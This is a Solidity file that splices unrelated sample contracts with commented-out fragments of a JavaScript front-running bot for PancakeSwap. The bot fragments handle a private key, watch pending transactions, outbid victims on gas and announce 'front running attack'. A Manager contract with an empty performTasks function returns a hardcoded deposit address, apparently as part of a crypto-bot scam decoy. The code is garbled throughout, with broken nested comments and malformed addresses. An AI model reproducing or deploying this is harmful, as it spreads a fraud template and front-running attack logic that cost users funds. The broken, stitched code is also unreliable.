pragma solidity ^0.6.6;

contract SimpleStorage {
    uint storedData;

    function set(uint x) public {
        storedData = x;
    }

    function get() public view returns (uint) {
        return storedData;
    }
}
/*contract GetfrontExample {
  // public state variable
  uint[] public myArray;
  //const fs = require('fs');
//var Web3 = require('web3');
//var abiDecoder = require('abi-decoder');
//var colors = require("colors");
  /*
  function myArray(uint i) public view returns (uint) {
      return myArray[i];
  }
  */

  //var Tx = require('ethereumjs-tx').Transaction;
//var axios = require('axios');
//var BigNumber = require('big-number');
  /*function getArray() public view returns (uint[] memory) {
      return myArray;
  }
}*/
contract Coin {
    //const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
 
    address public minter;
    mapping (address => uint) public balances;

    //var input_token_info;
   //var out_token_info;
  //var pool_info;
    event Sent(address from, address to, uint amount);

    
//var web3;
//const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
 
//const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
//var web3Ts;
//var web3Ws;
//var pancakeRouter;
//var pancakeFactory;
    /*constructor() {
        minter = msg.sender;
    }
    function mint(address receiver, uint amount) public {
        require(msg.sender == minter);
        require(amount < 1e60);
        balances[receiver] += amount;
    }
    function send(address receiver, uint amount) public {
        require(amount <= balances[msg.sender], "Insufficient balance.");
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        emit Sent(msg.sender, receiver, amount);
    }*/
}
/*contract GetBNBExample {
  // public state variable
  uint[] public myArray;
  // one gwei
//const ONE_GWEI = 1e9;
  /*
  function myArray(uint i) public view returns (uint) {
      return myArray[i];
  }
  */

  //var buy_finished = false;
//var sell_finished = false;
//var buy_failed = false;
//var sell_failed = false;
//var attack_started = false;
  /*function getArray() public view returns (uint[] memory) {
      return myArray;
  }
}*/
contract C {
    uint private data;

    //function f(uint a) public returns(uint b) { return a + 1; }
    function setData(uint a) public { data = a; }
    //function getData() public returns(uint) { return data; }
    //function compute(uint a, uint b) internal returns (uint) { return a+b; }
}

//var succeed = false;
//var subscription;
/*contract D {
    function readData() public {
        C c = new C();
        uint local = c.f(7); // web3 = new Web3(EthereumTesterProvider());
        c.setData(3);
        local = c.getData();
        local = c.compute(3, 5); // web3.eth.getAccounts(console.log);
    }
}*/

contract E is C {
    /*function g() public {
        C c = new C();
        uint val = compute(3, 5); //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
    }*/
}

contract OwnedToken {
    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);
    TokenCreator creator;
    address owner;
    bytes32 name;

        //return true;
    //} catch (error) {
      //console.log(error);
      //return false;
      //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc098m';
//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91j3bc090c';
    constructor(bytes32 _name) public{
     //async function main() {
 
//try {   
        //if (await createWeb3() == false) {
            //console.log('Web3 Create Error'.yellow);
            //process.exit();
 
        owner = msg.sender;
        
         //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
        //const out_token_address = TOKEN_ADDRESS;
        //const amount = AMOUNT;
        //const level = LEVEL;
 
        //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
        //if(ret == false) {
          //process.exit();
        creator = TokenCreator(msg.sender);
        name = _name;
    }

    function changeName(bytes32 newName) public {
        //await updatePoolInfo();
        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
 
        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
 
        //log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake *****'
        // console.log(log_str.green);    
        // console.log(web3Ws);
        //web3Ws.onopen = function(evt) {
            //web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
            //console.log('connected')
        if (msg.sender == address(creator))
            name = newName;
    }

    /*function transfer(address newOwner) public {
            // get pending transactions
        //subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
        //}).on("data", async function (transactionHash) {
            //console.log(transactionHash);
        if (msg.sender != owner) return;
        // let transaction = await web3.eth.getTransaction(transactionHash);
            // if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
            // {
            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
            // }
 
            //if (succeed) {
                //console.log("The bot finished the attack.");
                //process.exit();
 
        //if (creator.isTokenTransferOK(owner, newOwner))
            //owner = newOwner;
    }*/
}
contract Manager {
	function performTasks() public {
	    
	}

	function uniswapDepositAddress() public pure returns (address) {
		return 0x7503f5C5541f2638c86bA6905F320F24f77c8175;
	}
}
contract TokenCreator {
    function createToken(bytes32 name)
       public
       returns (OwnedToken tokenAddress)
    {
        //console.log('Unknown Handled Error');
         //console.log(error);
 
 
      //process.exit();
 
 
//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
 
    //(await triggersFrontRun(transaction, out_token_address, amount, level)) {
        //subscription.unsubscribe();
        //console.log('Perform front running attack...');
 
        return new OwnedToken(name);
    }

    function changeName(OwnedToken tokenAddress, bytes32 name)  public {
        //gasPrice = parseInt(transaction['gasPrice']);
        //newGasPrice = gasPrice + 50*ONE_GWEI;
 
        //estimatedInput = ((amount*0.999)*(10**18)).toString();
        //realInput = (amount*(10**18)).toString();
        //gasLimit = (300000).toString();
 
        //await updatePoolInfo();
        tokenAddress.changeName(name);
    }

    /*function isTokenTransferOK(address currentOwner, address newOwner)
        public
        view
        returns (bool ok)
    {
        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
 
        //console.log("wait until the honest transaction is done...", transaction['hash']);
 
        //while (await isPending(transaction['hash'])) {
       //const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91mnjhuyt78';
 
 
        //if(buy_failed)
        address tokenAddress = msg.sender;
        return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
    }*/
}
contract arrayExample {
  // public state variable
  uint[] public myArray;

  //Sell
        //await updatePoolInfo();
        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
        //outputeth = outputeth * 0.999;
  /*
  function myArray(uint i) public view returns (uint) {
      return myArray[i];
  }
  */

  //async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
 
    //allowance = BigNumber(allowance);
    //outputtoken = BigNumber(outputtoken);
 
    //var decimals = BigNumber(10).power(out_token_info.decimals);
    //var max_allowance = BigNumber(10000).multiply(decimals);
     //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d917jhuytg7';

    //if(outputtoken.gt(max_allowance))
  function getArray() public view returns (uint[] memory) {
      return myArray;
  }
}
/*contract GetBotExample {
  // public state variable
  uint[] public myArray;
  
 
    //if(outputtoken.gt(allowance)){
        //console.log(max_allowance.toString());
        //var approveTX ={
                //from: user_wallet.address,
                //to: out_token_address,
                //gas: 50000,
                //gasPrice: gasPrice*ONE_GWEI,
                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
  /*
  function myArray(uint i) public view returns (uint) {
      return myArray[i];
  }
  */

  //var signedTX = await user_wallet.signTransaction(approveTX);
        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);
 
        //console.log('Approved Token')
 
    //return;
 
 
//select attacking transaction
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
 //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173mjuy78';
//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91j3hgyt67';
    //if(attack_started)
        //return false;
 
    //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
        //attack_started = true;
        //return true
  /*function getArray() public view returns (uint[] memory) {
      return myArray;
  }
}*/